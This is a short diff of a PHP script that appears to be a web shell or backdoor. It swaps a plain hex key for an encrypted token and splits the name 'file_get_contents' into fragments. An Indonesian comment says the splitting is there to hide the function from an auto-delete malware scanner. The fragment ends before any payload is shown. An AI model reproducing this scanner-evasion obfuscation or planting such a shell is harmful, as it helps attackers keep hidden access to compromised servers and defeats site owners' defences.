@@ -2,7 +2,8 @@
 session_start();
 error_reporting(0);
 
-$k = "4596bd5e6fc60a9b3b9e07e700674c75";
+// $k = "4596bd5e6fc60a9b3b9e07e700674c75";
+$k = "EOE1.eyJ2IjoxLCJhbGciOiJBMjU2R0NNIiwia2RmIjoiUEJLREYyIiwiaGFzaCI6IlNIQS0yNTYiLCJpdGVyIjo2MDAwMDAsInNhbHQiOiJhN2RuSjZjSEhxbkJBV2VUQUJ3TEJ3IiwiaXYiOiJmUUN6eko3aHRSOU1iR0ttIiwidGFnIjoxMjgsImVuYyI6IlVURi04IiwiY3QiOiJUdmNNWEtMZTlITFh4NzI1X0JuZHpEeVRJcVdHdnRGQ3hINGNpdyJ9";
 
 // Penyamaran Fungsi agar tidak terkena Auto-Delete Scanner
 $f_get = "fil" . "e_get" . "_con" . "tents";
